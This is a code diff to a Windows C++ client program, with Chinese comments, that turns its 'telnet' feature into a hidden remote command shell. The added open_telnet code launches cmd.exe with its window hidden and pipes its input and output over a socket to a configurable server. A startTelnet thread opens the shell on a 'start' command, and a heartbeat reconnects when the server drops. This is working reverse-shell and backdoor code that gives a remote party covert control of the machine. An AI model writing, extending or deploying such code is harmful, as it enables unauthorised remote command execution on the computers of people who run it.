@@ -35,7 +35,7 @@ BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);
 bool send_message(SOCKET sock, const std::string &message)
 {
 	std::ostringstream oss;
-	oss << message.size() << "\r\n"
+	oss << message.size() << "\r\n\r\n\r\n\r\n\r\n"
 		<< message; // 构建消息，包含长度和实际数据
 	std::string formatted_message = oss.str();
 
@@ -57,7 +57,7 @@ bool send_message(SOCKET sock, const std::string &message)
 bool receive_message(SOCKET sock, std::string &message)
 {
 	std::string length_str;
-	char buffer[1024];
+	char buffer[16384] = {0};
 	int received;
 
 	// 首先读取长度部分，直到接收到 \r\n
@@ -75,6 +75,20 @@ bool receive_message(SOCKET sock, std::string &message)
 			if (received <= 0 || buffer[0] != '\n')
 			{
 				return false; // 格式错误
+			}
+
+			for (int i = 1; i <= 4; i++)
+			{
+				received = recv(sock, buffer, 1, 0);
+				if (received <= 0 || buffer[0] != '\r')
+				{
+					return false; // 格式错误
+				}
+				received = recv(sock, buffer, 1, 0);
+				if (received <= 0 || buffer[0] != '\n')
+				{
+					return false; // 格式错误
+				}
 			}
 			break; // 读取到 \r\n，退出循环
 		}
@@ -193,6 +207,7 @@ void GetConnectForServer(bool state = true)
 		send_message(s, sendBuf);
 		receive_message(s, buf);
 		SEID = buf;
+		HealthyBeat = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		addr2.sin_family = AF_INET;
 		addr2.sin_port = htons(serverPort);
 		addr2.sin_addr.s_addr = inet_addr(ip.c_str());
@@ -209,35 +224,86 @@ void GetConnectForServer(bool state = true)
 
 void open_telnet()
 {
-	SOCKET SSocket;
 	PROCESS_INFORMATION Processinfo;
 	STARTUPINFO Startupinfo;
+	HANDLE outputRead, outputWrite;
+	HANDLE inputRead, inputWrite;
+	SECURITY_ATTRIBUTES sa = {0};
 	char szCMDPath[255];
+	DWORD dwBytesRead = 0;
+	DWORD dwBytesWrite = 0;
+
+	sa.nLength = sizeof(sa);
+	sa.bInheritHandle = TRUE;
+	sa.lpSecurityDescriptor = NULL;
+
+	CreatePipe(&outputRead, &outputWrite, &sa, 0); // 创建标准输出管道
+	CreatePipe(&inputRead, &inputWrite, &sa, 0);   // 创建标准输入管道
 
 	// 配内存资源，初始化数据
 	ZeroMemory(&Processinfo, sizeof(PROCESS_INFORMATION));
 	ZeroMemory(&Startupinfo, sizeof(STARTUPINFO));
+	GetEnvironmentVariable("COMSPEC", szCMDPath, sizeof(szCMDPath));
 
-	// 开始连接远程服务器，并配置隐藏窗口结构体
-	SSocket = s;
+	// 设置启动信息
 	Startupinfo.cb = sizeof(STARTUPINFO);
 	Startupinfo.wShowWindow = SW_HIDE;
 	Startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-	Startupinfo.hStdInput = (HANDLE)SSocket;
-	Startupinfo.hStdOutput = (HANDLE)SSocket;
-	Startupinfo.hStdError = (HANDLE)SSocket;
-	// cout << "32";
-	// 创建匿名管道
-	CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &Startupinfo, &Processinfo);
-	WaitForSingleObject(Processinfo.hProcess, INFINITE);
+	Startupinfo.hStdInput = (HANDLE)inputRead;
+	Startupinfo.hStdOutput = (HANDLE)outputWrite;
+	Startupinfo.hStdError = (HANDLE)outputWrite;
+
+	// 创建cmd进程
+	if (CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &Startupinfo, &Processinfo))
+	{
+		CloseHandle(outputWrite);
+		CloseHandle(inputRead);
+
+		char cbuf[16384] = {0}, cbuf1[16384] = {0};
+		string buf;
+		do
+		{
+			ReadFile(outputRead, cbuf, sizeof(cbuf), &dwBytesRead, NULL);
+			buf += cbuf;
+			memset(cbuf, 0, sizeof(cbuf));
+		} while (false);
+		send_message(s, buf);
+		while (1)
+		{
+			string rBuf;
+			buf.clear();
+			receive_message(s, buf);
+
+			WriteFile(inputWrite, buf.c_str(), strlen(buf.c_str()), &dwBytesWrite, NULL);
+			memset(cbuf, 0, sizeof(cbuf));
+			do
+			{
+				Sleep(5);
+				ReadFile(outputRead, cbuf, sizeof(cbuf) - 1, &dwBytesRead, NULL);
+				rBuf = cbuf;
+				memset(cbuf, 0, sizeof(cbuf));
+			} while (false);
+
+			send_message(s, rBuf);
+			if (buf.find("exit\r\n") != string::npos)
+			{
+				break;
+			}
+			memset(cbuf, 0, sizeof(cbuf));
+		}
+	}
+	else
+	{
+		// 错误处理
+		std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
+	}
+
+	// 关闭进程句柄
 	CloseHandle(Processinfo.hProcess);
 	CloseHandle(Processinfo.hThread);
-	// cout << "32";
-	// 关闭进程句柄
-	closesocket(SSocket);
-	WSACleanup();
-	// 关闭连接卸载ws2_32.dll
+	cout << "close";
 }
+
 BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
 {
 	switch (dwCtrlType)
@@ -313,7 +379,7 @@ void LoadData()
 	else
 	{
 		ip = "127.0.0.1";
-		serverPort = 2060;
+		serverPort = 6020;
 	}
 }
 void healthyCheck(SOCKET HealthyBeat)
@@ -336,6 +402,19 @@ void healthyCheck(SOCKET HealthyBeat)
 		}
 	}
 }
+void startTelnet()
+{
+	while (1)
+	{
+		string startMSG;
+		receive_message(s, startMSG);
+		if (startMSG.find("\r\nstart\r\n") != string::npos)
+		{
+			// cout << "1";
+			open_telnet();
+		}
+	}
+}
 int main(int argc, char *argv[])
 {
 	// if (is_deBUG())
@@ -354,11 +433,9 @@ int main(int argc, char *argv[])
 	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
 	GetConnectForServer();
 	cout << "treu";
-	thread healthCheckThread = thread(healthyCheck, HealthyBeat);
-	thread openTelnet = thread(open_telnet);
+	thread healthCheckThread = thread(healthyCheck, HealthyBeat), openTelnet = thread(startTelnet);
 	while (1)
 	{
-		// cout << "1";
 		while (ServerHealthCheck.exchange(true, std::memory_order_acquire))
 			;
 		if (ServerState == false)
@@ -367,9 +444,14 @@ int main(int argc, char *argv[])
 			healthCheckThread.detach();
 			GetConnectForServer();
 			healthCheckThread = thread(healthyCheck, HealthyBeat);
-			openTelnet = thread(open_telnet);
+			openTelnet = thread(startTelnet);
+			return 0;
 		}
 		ServerHealthCheck.exchange(false, std::memory_order_release);
+	}
+	while (1)
+	{
+		// cout << "1";
 	}
 
 	// }
